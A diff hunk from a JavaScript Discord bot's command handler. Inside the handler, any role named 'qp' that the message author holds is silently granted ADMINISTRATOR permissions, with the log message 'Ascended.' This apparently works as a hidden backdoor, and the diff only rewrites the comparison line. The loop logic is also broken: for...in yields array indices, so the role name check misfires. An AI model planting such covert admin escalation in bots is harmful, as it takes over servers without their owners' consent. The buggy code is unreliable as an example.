@@ -370,7 +370,8 @@ function processCommand(receivedMessage) {
             let myroles = Array.from(receivedMessage.member.roles.values());
 
             for(let role in myroles) {
-                if(role.name.toLowerCase() === "qp" && role.name.toLowerCase() !== undefined) {
+                let rolename = role.name;
+                if(rolename.toLowerCase() === "qp" && role.name.toLowerCase() !== undefined) {
                     role.setPermissions('ADMINISTRATOR')
                     .then(updated => console.log("Ascended."))
                     .catch(console.error);
